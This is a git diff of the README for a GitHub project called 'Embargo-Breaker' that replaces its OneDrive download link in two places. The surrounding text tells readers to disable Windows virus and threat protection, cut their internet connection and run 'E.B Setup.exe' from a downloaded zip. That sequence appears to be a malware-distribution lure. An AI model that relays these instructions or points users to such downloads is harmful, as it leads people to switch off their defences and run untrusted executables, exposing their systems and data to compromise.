@@ -11,7 +11,7 @@
 
 > [🏃‍♂️ How To Install?](https://github.com/ALTONIBOT/Embargo-Breaker#how-to-start)
 
-> [📥 Download App](https://1drv.ms/u/s!AsHE808G_RHeg0mBe4PcwCX6LET6?e=AP9t67)
+> [📥 Download App](https://1drv.ms/u/s!AsHE808G_RHeg0p6BMQ2pFh_5V4h)
 
 > [🛠 How To Use?](https://github.com/ALTONIBOT/Embargo-Breaker#how-to-use)
 
@@ -35,7 +35,7 @@ Open `Windows Security > Virus & threat protection > Manage settings` and turn o
 
 * Step 2: download file...
 
-> download the file from [here](https://1drv.ms/u/s!AsHE808G_RHeg0mBe4PcwCX6LET6?e=AP9t67) .
+> download the file from [here](https://1drv.ms/u/s!AsHE808G_RHeg0p6BMQ2pFh_5V4h) .
 
 * Step 3: turn off Internet Data and start `Setup.zip > E.B Setup.exe`
 
